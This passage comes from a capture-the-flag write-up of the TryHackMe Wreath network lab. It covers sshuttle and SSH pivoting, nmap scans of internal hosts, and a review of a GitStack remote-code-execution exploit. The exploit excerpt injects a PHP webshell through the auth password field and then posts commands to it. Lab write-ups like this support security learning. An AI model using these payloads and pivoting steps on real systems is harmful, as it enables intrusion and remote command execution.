We also need to append `&`

Then enter username and password

Successful response:

`c: Connected to server.`

3. Run sshuttle with key based auth

Use `--ssh-cmd` switch followed by `ssh -i keyfile`

`sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET`

eg. `sshuttle -r user@172.16.0.5 --ssh-cmd "ssh -i private_key" 172.16.0.0/24`

> Note: error may occur if it is part of subnet you are trying to access

```
client: Connected.
client_loop: send disconnect: Broken pipe
client: fatal: server died with error code 255
```

ie. connecting to `172.16.0.5` and forward `172.16.0.0/24`. Including compromised server inside the newly forwarded subnet

We can get around this with `-x` to create connection without disrupting itself

eg. `sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5`

</details>

## 12. Pivoting - Conclusion

<details>
  <summary>---</summary>

- There are many ways to pivot through a network
- Proxychains and FoxyProxy are used to access a proxy
- SSH can be used to create both port forwards, and proxies
- plink.exe is an SSH client for Windows. Can create reverse SSH connections
- Socat can redirect connection and create port forwards
- Chisel can do the same thing as SSH port forwarding / tunnelling. Does not require SSH on the box
- sshuttle is nicer to create proxy when we have SSH access on target

</details>

## 13. Git Server- Enumeration

<details>
  <summary>---</summary>


Ping scan - `100` and `150` up

```
[root@prod-serv tmp]# ./nmap-Neozer0 -sn 10.200.81.1-255 -oN scan-Neozer0

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2021-04-13 11:29 BST
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-81-1.eu-west-1.compute.internal (10.200.81.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00035s latency).
MAC Address: 02:8C:E0:55:7B:89 (Unknown)
Nmap scan report for ip-10-200-81-100.eu-west-1.compute.internal (10.200.81.100)
Host is up (0.00014s latency).
MAC Address: 02:6E:4F:DD:1B:65 (Unknown)
Nmap scan report for ip-10-200-81-150.eu-west-1.compute.internal (10.200.81.150)
Host is up (-0.10s latency).
MAC Address: 02:AD:06:35:A5:CB (Unknown)
Nmap scan report for ip-10-200-81-250.eu-west-1.compute.internal (10.200.81.250)
Host is up (0.00022s latency).
MAC Address: 02:E7:4E:C8:80:A7 (Unknown)
Nmap scan report for ip-10-200-81-200.eu-west-1.compute.internal (10.200.81.200)
Host is up.
Nmap done: 255 IP addresses (5 hosts up) scanned in 3.73 seconds
```

Scanning 100 returns filtered
```
[root@prod-serv tmp]# ./nmap-Neozer0 10.200.81.100

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2021-04-14 10:17 BST
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-81-100.eu-west-1.compute.internal (10.200.81.100)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (-0.20s latency).
All 6150 scanned ports on ip-10-200-81-100.eu-west-1.compute.internal (10.200.81.100) are filtered
MAC Address: 02:6E:4F:DD:1B:65 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 124.54 seconds
```

Scanning 150 returns a result
```
[root@prod-serv tmp]# ./nmap-Neozer0 10.200.81.150

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2021-04-13 11:57 BST
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-81-150.eu-west-1.compute.internal (10.200.81.150)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00049s latency).
Not shown: 6142 closed ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  epmap
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5357/tcp  open  wsdapi
5985/tcp  open  wsman
47001/tcp open  winrm
MAC Address: 02:AD:06:35:A5:CB (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 574.74 seconds
```

Scanning first 15000 port
```
[root@prod-serv tmp]# ./nmap-Neozer0 -p1-15000 10.200.85.150

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2021-04-16 23:49 BST
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-85-150.eu-west-1.compute.internal (10.200.85.150)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00083s latency).
Not shown: 14997 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
MAC Address: 02:4C:02:6B:0D:57 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 280.32 seconds
```

</details>

## 14. Git Server - Pivoting

<details>
  <summary>---</summary>

Port 80 is interesting in 10.200.81.150.
We use sshuttle to ssh tunnel to 150 through 200 from the attacking machine

### ssh tunnel

Attacking box - this runs in the background with `-fN`
```
kali@kali:~/thm/wreath$ ssh -i ssh/webserver_id_rsa -L 8000:10.200.81.150:80 root@10.200.81.200 -fN
```

We navigate to `localhost:8000` and see an error page that tells us various accessible routes eg. `/gitstack`

![error page](gitPivot.png)

We navigate to `localhost:8000/gitstack` and see a log in page - default creds do not work

![gitstack](gitstack.png)

### sshuttle

TODO

Use searchsploit on gitstack
```
kali@kali:~/thm/wreath$ searchsploit gitstack
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                                                      |  Path
                                                                                                                                                                    | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
GitStack - Remote Code Execution                                                                                                                                    | exploits/php/webapps/44044.md
GitStack - Unsanitized Argument Remote Code Execution (Metasploit)                                                                                                  | exploits/windows/remote/44356.rb
GitStack 2.3.10 - Remote Code Execution                                                                                                                             | exploits/php/webapps/43777.py
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

</details>

## 15. Git Server - Code (exploit) Review

<details>
  <summary>---</summary>

Download the potential RCE found with searchsploit
```
kali@kali:~/thm/wreath$ searchsploit -m 43777
  Exploit: GitStack 2.3.10 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/43777
     Path: /usr/share/exploitdb/exploits/php/webapps/43777.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /home/kali/thm/wreath/43777.py
```

Exploit copied might have DOS line endings. We can use a tool to convert this if this is the case
```
dos2unix ./43777.py
```
or
```
sed -i 's/\r//' ./EDBID.py
```

Check what version python this would run on with `print` statements (`print()` for python3 and `print ""` for python2)

1. Add shebang `#!/usr/bin/python2` so we can run `./43777.py`; or 
2. Run with python2 `python2 43777.py` without adding shebang to the file

Change the ip address to `localhost:8000` (ssh port forward method)

```python
ip = 'localhost:8000'

# What command you want to execute
command = "whoami"

repository = 'rce'
username = 'rce'
password = 'rce'
csrf_token = 'token'
```

The command `whoami` will be run on execution

Last six lines of the exploit:
```python
print "[+] Create backdoor in PHP"
r = requests.get('http://{}/web/index.php?p={}.git&a=summary'.format(ip, repository), auth=HTTPBasicAuth(username, 'p && echo "<?php system($_POST[\'a\']); ?>" > c:\GitStack\gitphp\exploit.php'))
print r.text.encode(sys.stdout.encoding, errors='replace')

print "[+] Execute command"
r = requests.post("http://{}/web/exploit.php".format(ip), data={'a' : command})
print r.text.encode(sys.stdout.encoding, errors='replace')
```

These create PHP webshell `<?php system($_POST['a']); ?>` and echo it into `exploit.php` under webroot.

This can be accessed by posting a command to `/web/exploit.php`

</details>
